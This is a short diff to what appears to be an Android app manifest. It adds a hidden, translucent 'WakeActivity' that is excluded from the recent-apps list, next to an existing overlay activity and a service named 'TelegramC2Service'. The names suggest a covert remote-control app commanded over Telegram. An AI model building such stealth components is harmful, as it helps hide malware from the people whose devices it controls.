@@ -44,6 +44,13 @@
             android:name=".OverlayActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:exported="false"/>
+            
+        <activity
+            android:name=".WakeActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:taskAffinity=""
+            android:excludeFromRecents="true"
+            android:exported="false"/>
 
         <service
             android:name=".TelegramC2Service"
